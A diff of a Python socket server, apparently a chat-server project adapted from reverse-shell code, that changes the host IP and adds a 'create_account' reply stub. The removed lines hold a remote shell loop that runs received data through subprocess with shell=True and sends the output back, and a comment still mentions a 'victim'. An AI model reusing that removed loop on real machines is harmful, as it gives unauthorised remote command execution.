@@ -10,7 +10,7 @@ def create_socket():
         global host
         global port
         global s
-        host = "10.250.64.198"
+        host = "10.250.253.162"
         port = 9998
         s = socket.socket()
 
@@ -41,11 +41,19 @@ def socket_accept():
     receive_commands(conn)
     conn.close()
 
+
 # Send commands to client/victim or a friend
 def receive_commands(conn):
     # TODO: Edit this so that user can create account, and the other stuff.
     while True:
-        data = s.recv(1024)
+        print("hi")
+        data = conn.recv(1024)
+        input_cmd = data.decode("utf-8")
+        res = "Waiting for valid response..."
+        if 'create_account' in input_cmd:
+            res = "create_account"
+
+        conn.send(str.encode(res))
 
         # allow client to 1. create an account and supply a unique user name
 
@@ -56,19 +64,6 @@ def receive_commands(conn):
         # server delivers undelivered messages to a particular user if they logged in
 
         # allow client to delete an account
-
-        # make sure there isn't cd
-        if data[:2].decode("utf-8") == 'cd':
-            os.chdir(data[3:].decode("utf-8"))
-
-        if len(data) > 0:
-            cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
-            output_byte = cmd.stdout.read() + cmd.stderr.read()
-            output_str = str(output_byte,"utf-8")
-            currentWD = os.getcwd() + "> "
-            s.send(str.encode(output_str + currentWD))
-
-            print(output_str)
 
 
 def main():
